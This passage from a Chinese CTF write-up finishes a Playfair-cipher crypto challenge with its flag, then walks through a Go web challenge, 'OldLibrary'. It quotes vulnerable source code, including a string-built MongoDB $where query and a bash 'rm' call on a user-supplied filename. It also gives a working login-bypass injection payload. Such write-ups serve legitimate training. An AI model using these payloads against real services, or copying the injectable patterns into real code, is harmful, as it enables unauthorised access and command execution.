            if i % 2 >= 1:
                res += int(i % 2/1)*"1"
            flag.append(res + "0")
        print("".join(flag)[:-1])
    c = input("输入要解密的数字串:")
    print(de_code(c))
    # m_code = input("请输入要加密的数字串:")
    # encode(m_code)
得到 `BINGO`
再去搜 `Translate the letter J into I`，发现是 多表代换加密 里的 [Playfair
cipher](https://ctf-wiki.org/crypto/classical/polyalphabetic/#playfair)。
有一个 [在线的 Playfair Cipher 工具](http://rumkin.com/tools/cipher/playfair.php)
可以直接在网页上编解码。
`flag{d58af5d2-2a51-4dde-5e5d-33539364cdbf}`
## Web
###  OldLibrary
> [附件下载](https://pan.baidu.com/s/1McgiElikTztBSS2CmOzFSg)
> 提取码（GAME）[备用下载](https://share.weiyun.com/Rv4DhlGk)
是个 golang 的题目。虽然咱不会 golang，但给了源码而不是二进制文件，看起来还是挺舒服的。
首先看各个接口
    router.POST("/delete", handler.IPCheckMiddleWare(), DeleteController)
    router.POST("/signin", LoginController)
    router.POST("/signup", RegisterController)
    router.POST("/download", handler.LoginCheckMiddleWare(), DownloadController)
    router.POST("/submit", handler.AdminCheckMiddleWare(), BookHandleController)
发现登录这里，sql 查询直接拼接了字符串
    db_table := Conn.DB("ctf").C("users")
    result := User{}
    err = db_table.Find(bson.M{"$where":"function() {if(this.username == '"+user.Username+"' && this.password == '"+user.Password+"') {return true;}}"}).One(&result)
而 handler 这里面提示了管理员用户名是 administrator
于是构造登录请求
    username=administrator&password=1' || '1'=='1
成功登录。
然后再看接口，发现有个 `/delete`，存在命令执行，而且是拼接字符串。
    func DeleteController(c *gin.Context) {    // The function is temporarily inaccessible
        var filename Filename
        if err := c.ShouldBindJSON(&filename); err != nil {
            c.JSON(500, gin.H{"msg": err})
            return
        }
        cmd := exec.Command("/bin/bash", "-c", "rm ./upload/pdf/" + filename.Filename)
        if err := cmd.Run(); err != nil {
            fmt.Println(err)
            return
        }
        c.String(http.StatusOK, fmt.Sprintf("File Deleted Successfully"))
    }
然而这个只能通过本地进行访问。
    func IPCheckMiddleWare() gin.HandlerFunc {
        return func(c *gin.Context) {
            if c.Request.RemoteAddr[:9] != "127.0.0.1" && c.Request.RemoteAddr[:9] != "localhost" {
                c.JSON(403, gin.H{"msg": "I'm sorry, your IP is forbidden"})
                return
            }
            c.Next()
        }
    }
再看 `/submit` 接口这里，可以上传 pdf，而这些输入的信息会进到 `makepdf` 函数里。
（安全客的 waf 又把 `script` 给拦了，源码需要把下面的 `gcript` 改成 `script`
    func BookHandleController(c *gin.Context) {
        var book Book
        if err := c.ShouldBind(&book); err != nil {
            c.JSON(500, gin.H{"msg": err})
            return
        }
        file, err := c.FormFile("covers")
        if err != nil {
            c.String(http.StatusBadRequest, fmt.Sprintf("Get form err: %s", err.Error()))
            return
        }
        filename := filepath.Base(file.Filename)
        if err := c.SaveUploadedFile(file, "/tmp/covers/" + filename); err != nil {
            c.String(http.StatusBadRequest, fmt.Sprintf("Upload covers err: %s", err.Error()))